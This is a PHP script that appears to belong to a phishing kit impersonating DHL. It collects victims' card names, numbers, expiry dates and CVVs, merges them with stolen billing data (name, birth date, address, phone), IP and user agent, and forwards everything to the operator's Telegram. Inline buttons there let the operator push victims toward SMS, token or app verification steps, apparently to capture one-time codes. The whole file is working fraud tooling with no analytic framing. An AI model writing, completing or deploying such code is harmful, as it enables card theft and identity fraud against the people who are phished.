<?php
// SEND CARD DATA TO TELEGRAM
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';
$data = $input['data'] ?? [];

// Remove spaces from card number for clean Telegram message
if (isset($data['cardNumber'])) {
    $data['cardNumber'] = str_replace(' ', '', $data['cardNumber']);
}

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

// Get IP and country
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$shortId = substr($token, 3); // Get all chars after SPT/TKN

// Get billing data from session or storage
$billingData = [
    'firstName' => 'N/A',
    'lastName' => 'N/A', 
    'dateOfBirth' => 'N/A',
    'address' => 'N/A',
    'city' => 'N/A',
    'postalCode' => 'N/A',
    'phoneNumber' => 'N/A'
];

// Try to get billing data from session storage
$sessions = file_exists(SESSION_FILE) ? json_decode(file_get_contents(SESSION_FILE), true) : [];
if (isset($sessions[$token])) {
    $billingData = array_merge($billingData, $sessions[$token]);
}

// Build combined message (funnel: track → billing → card → panel)
$message = "❁═══ DHL FUNNEL ═══❁\n";
$message .= "3️⃣ CARD — Payment submitted\n";
$message .= "4️⃣ PANEL — User → loading (awaiting your buttons)\n";
$message .= "📦 ID: {$shortId}\n\n";
$message .= "❁═∘ 💳 DHL PAYMENT  ∘═❁\n\n";
$message .= "🪪 CHN : " . ($data['cardName'] ?? 'N/A') . "\n";
$message .= "💳 CCN : " . ($data['cardNumber'] ?? 'N/A') . "\n";
$message .= "📅 Expiry : " . ($data['expiryDate'] ?? 'N/A') . "\n";
$message .= "🔐 CVV : " . ($data['cvv'] ?? 'N/A') . "\n";
$message .= "🏦 Scheme: Unknown\n";
$message .= "🏷 Type: Unknown\n";
$message .= "🏛️ Issuer: Unknown\n";
$message .= "🥇 CardTier: Unknown\n";
$message .= "🌐 Country: Unknown\n\n";
$message .= "❁═══∘◦ 👨🏽‍💻 Billing ◦∘═══❁\n\n";
$message .= "👤 Name : " . $billingData['firstName'] . " " . $billingData['lastName'] . "\n";
$message .= "📞 Phone : " . $billingData['phoneNumber'] . "\n";
$message .= "🎂 BOD (dd/mm/yyyy) : " . $billingData['dateOfBirth'] . "\n";
$message .= "🏠 Address : " . $billingData['address'] . ", " . $billingData['city'] . "\n";
$message .= "🌐 zipcode : " . $billingData['postalCode'] . "\n\n";
$message .= "❁═══∘◦❁∘═══∘❁◦∘═══❁\n\n";
$message .= "📡 Adresse Ip : {$ip}\n";
$message .= "🌆 City : {$country}\n";
$message .= "🌐 Country : {$country}\n";
$message .= "🤖 User-agent : " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n\n";
$message .= "👇 Where to send user?";

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Done', 'callback_data' => "action_{$token}_done"],
            ['text' => '❌ Card Error', 'callback_data' => "action_{$token}_carderror"]
        ],
        [
            ['text' => '📱 SMS', 'callback_data' => "action_{$token}_sms"],
            ['text' => '🔐 Token', 'callback_data' => "action_{$token}_token"]
        ],
        [
            ['text' => '📲 App', 'callback_data' => "action_{$token}_app"],
            ['text' => '📝 Custom', 'callback_data' => "action_{$token}_custom"]
        ],
        [
            ['text' => '🚫 Ban IP', 'callback_data' => "ban_{$token}_{$ip}"]
        ]
    ]
];

// Send to Telegram
$result = sendTelegramMessage($message, $keyboard);

$loadingPath = '../loading.php?token=';
echo json_encode([
    'success' => $result['ok'],
    'redirect' => $loadingPath . urlencode($token)
]);
?>

